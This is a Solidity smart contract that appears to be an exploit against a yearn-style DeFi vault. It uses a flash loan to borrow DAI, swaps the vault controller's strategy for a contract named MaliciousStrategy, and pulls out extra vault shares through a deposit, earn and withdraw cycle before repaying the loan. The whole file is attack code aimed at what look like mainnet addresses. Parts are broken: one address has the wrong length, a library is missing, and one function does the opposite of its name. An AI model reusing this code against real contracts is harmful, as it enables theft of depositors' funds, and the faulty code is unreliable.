interface IERC20 {
    function transfer(address, uint) external returns (bool);
    function approve(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

interface yVault {
    function deposit(uint) external;
    function withdraw(uint) external;
    function earn() external;
    function balanceOf(address) external view returns (uint);
    function transfer(address, uint) external returns (bool);
    function transferFrom(address, address, uint) external returns (bool);
}

interface ILendingPool {
    function flashLoan(address receiver, address[] calldata assets, uint[] calldata amounts, uint[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referralCode) external;
}

interface IFlashLoanReceiver {
    function executeOperation(address[] calldata assets, uint[] calldata amounts, uint[] calldata premiums, address initiator, bytes calldata params) external returns (bool);
}

contract Strategy is IFlashLoanReceiver {
    address constant vault = 0xACd43E627e64355f1861cEC6d3a6688B31a6F952;
    address constant token = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant controller = 0x9E65Ad11b299CA0Abefc2799dDB6314Ef2d910D75;
    address constant lendingPool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    MaliciousStrategy ms;

    function run() public {
        ms = new MaliciousStrategy();
        controller.call(abi.encodeWithSignature("setStrategy(address,address)", token, address(ms)));
        address[] memory assets = new address[](1);
        assets[0] = token;
        uint[] memory amounts = new uint[](1);
        amounts[0] = 1000000000000000000000; // 1000 DAI
        uint[] memory modes = new uint[](1);
        modes[0] = 0;
        ILendingPool(lendingPool).flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
        DexUtils.swapExcessTokensToBaseToken(token);
    }

    function executeOperation(address[] calldata assets, uint[] calldata amounts, uint[] calldata premiums, address initiator, bytes calldata params) external returns (bool) {
        IERC20(token).transfer(address(ms), amounts[0]);
        ms.approveVault();
        IERC20(token).approve(vault, amounts[0]);
        yVault(vault).deposit(amounts[0]);
        yVault(vault).earn();
        uint shares = yVault(vault).balanceOf(address(this));
        yVault(vault).withdraw(shares);
        uint extraShares = yVault(vault).balanceOf(address(ms));
        if (extraShares > 0) {
            ms.transferShares(address(this), extraShares);
            yVault(vault).withdraw(extraShares);
        }
        uint totalDebt = amounts[0] + premiums[0];
        IERC20(token).approve(lendingPool, totalDebt);
        return true;
    }
}

contract MaliciousStrategy {
    address vault = 0xACd43E627e64355f1861cEC6d3a6688B31a6F952;
    address token = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    function approveVault() public {
        IERC20(token).approve(vault, type(uint256).max);
    }

    function withdraw(uint amount) external {
        yVault(vault).deposit(amount);
    }

    function transferShares(address to, uint amount) public {
        yVault(vault).transfer(to, amount);
    }
}
